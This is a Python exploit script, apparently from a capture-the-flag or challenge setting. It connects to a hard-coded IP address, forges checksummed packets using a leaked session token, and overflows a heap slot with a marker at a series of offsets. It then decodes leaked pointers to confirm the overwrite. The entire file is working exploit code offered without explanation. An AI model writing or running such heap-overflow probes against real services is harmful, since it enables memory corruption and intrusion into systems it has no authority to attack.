#!/usr/bin/env python3
import socket, struct, re, sys

HOST, PORT = "144.79.188.39", int(sys.argv[1]) if len(sys.argv) > 1 else 37082
C = 0x5A5A5A5A41414141
MARK = 0x1122334455667788


def rd(s, t=0.7):
    s.settimeout(t)
    buf = b""
    try:
        while True:
            d = s.recv(4096)
            if not d:
                break
            buf += d
    except socket.timeout:
        pass
    return buf


def checksum(ptype, plen, payload, token):
    x = ((((ptype << 24) & 0xFFFFFFFF) ^ token) & 0xFFFFFFFF) ^ plen
    x ^= 0x31415926
    x &= 0xFFFFFFFF
    for i in range(plen):
        x = ((x << 5) | (x >> 27)) & 0xFFFFFFFF
        x = (x + ((i * 0x45D9F3B) ^ payload[i])) & 0xFFFFFFFF
    return x & 0xFFFFFFFF


def send_packet(s, ptype, payload, token):
    plen = len(payload)
    ck = checksum(ptype, plen, payload, token)
    s.sendall(f"{ptype}\n{plen}\n{ck:x}\n".encode() + payload)


def try_one(slot_rlen, off):
    s = socket.create_connection((HOST, PORT), timeout=5)
    banner = rd(s, 1.5)
    token = int(re.search(rb"session token: ([0-9a-f]{8})", banner).group(1), 16)
    tok12 = (token & 0xFFFFFFFF) << 12

    def pkt(pt, pl):
        send_packet(s, pt, pl, token)
        return rd(s, 0.7)

    pkt(2, struct.pack("<I", (token ^ 0xC0FFEE00) & 0xFFFFFFFF))
    pkt(3, struct.pack("<H", slot_rlen) + b"B" * slot_rlen)
    pkt(4, b"Z")
    r = pkt(4, b"D")
    m = re.search(rb"0x([0-9a-f]+)", r)
    fp1 = ((int(m.group(1), 16) ^ C ^ tok12) & 0xFFFFFFFFFFFFFFFF) if m else None
    ov = bytearray(0x100)
    struct.pack_into("<Q", ov, off, MARK)
    pkt(3, struct.pack("<H", 0x100) + bytes(ov))
    r = pkt(4, b"D")
    m = re.search(rb"0x([0-9a-f]+)", r)
    fp2 = ((int(m.group(1), 16) ^ C ^ tok12) & 0xFFFFFFFFFFFFFFFF) if m else None
    s.close()
    hit = fp2 == MARK
    print(f"slot={slot_rlen:#x} off={off:#x} fp1={fp1 and hex(fp1)} fp2={fp2 and hex(fp2)} HIT={hit}", flush=True)
    return hit


def main():
    # 0x80 slot first (chunk 0x90), then report
    for off in (0x90, 0xA0, 0xB0, 0xC0, 0xD0, 0xE0, 0xF0, 0x80, 0x88, 0x98, 0xA8, 0xB8):
        try:
            if try_one(0x80, off):
                return
        except Exception as e:
            print(f"slot=0x80 off={off:#x} ERR {e}", flush=True)
    # tiny slot
    for off in (0x20, 0x30, 0x40, 0x50, 0x60, 0x70, 0x80):
        try:
            if try_one(1, off):
                return
        except Exception as e:
            print(f"slot=1 off={off:#x} ERR {e}", flush=True)


if __name__ == "__main__":
    main()
